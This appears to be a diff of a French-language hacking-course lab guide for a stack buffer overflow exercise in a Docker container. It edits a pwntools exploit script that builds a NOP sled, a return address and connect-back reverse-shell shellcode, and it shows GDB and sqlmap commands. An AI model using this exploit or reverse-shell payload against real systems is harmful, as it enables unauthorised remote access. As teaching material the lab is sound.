@@ -62,7 +62,7 @@ flowchart LR
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
-| 1h | buffovf (port 9001) | `~/cours-hacking/jour-3/labs/` | T1068 |
+| 1h | buffovf-target (port 9001) | `~/cours-hacking/jour-3/labs/` | T1068 |
 
 ### Contexte métier
 
@@ -73,7 +73,7 @@ Les buffer overflows restent dans le top 3 des vulnérabilités critiques (MITRE
 ```bash
 docker compose up -d --build buffovf
 nc -z localhost 9001 && echo "OK"
-pip install pwntools
+pip install --break-system-packages pwntools
 mkdir -p ~/cours-hacking/jour-3/labs && cd ~/cours-hacking/jour-3/labs
 ```
 
@@ -105,15 +105,27 @@ from pwn import *
 context.arch = 'i386'
 context.os = 'linux'
 
-OFFSET = 76              # 64 buffer + 4 EBP + 8 align = 76
+# OFFSET = 68 octets (64 buffer + 4 saved EBP)
+# Trouvable avec : cyclic(200) puis cyclic_find(eip_value) dans GDB
+OFFSET = 68
+
 CALLBACK_IP = "172.17.0.1"  # IP du bridge docker0
 CALLBACK_PORT = 4444
 
-print(f"[*] Reverse shell → {CALLBACK_IP}:{CALLBACK_PORT}")
+print(f"[*] Reverse shell -> {CALLBACK_IP}:{CALLBACK_PORT}")
 shellcode = asm(shellcraft.i386.linux.connect(CALLBACK_IP, CALLBACK_PORT))
 
-payload = b"A" * OFFSET + b"BBBB" + b"\x90" * 32 + shellcode
-print(f"[*] Payload : {len(payload)} octets")
+# NOP sled : améliore la fiabilité en cas de léger décalage d'adresse
+nop_sled = b"\x90" * 100
+
+# Adresse de retour : pointer dans le NOP sled.
+# À trouver dans GDB : (gdb) run < <(python3 -c "print('A'*200)")
+# Puis : (gdb) x/200x $esp  pour localiser le début du buffer.
+# Valeur typique sans ASLR : 0xffffcf00 - 0xffffd000
+EIP_ADDR = 0xffffcf70   # <-- À ajuster après analyse GDB
+
+payload = b"A" * OFFSET + p32(EIP_ADDR) + nop_sled + shellcode
+print(f"[*] Payload : {len(payload)} octets, EIP -> {hex(EIP_ADDR)}")
 
 r = remote('localhost', 9001, timeout=10)
 r.sendline(payload)
@@ -217,7 +229,7 @@ sqlmap -u "http://localhost:8081/?id=1" \
 ```bash
 docker exec -it buffovf-target bash
 cd /opt && gdb -q ./vuln
-(gdb) run $(python3 -c "print('A'*100)")
+(gdb) run < <(python3 -c "print('A'*100)")
 # Noter la valeur de EIP après crash
 ```
 </details>
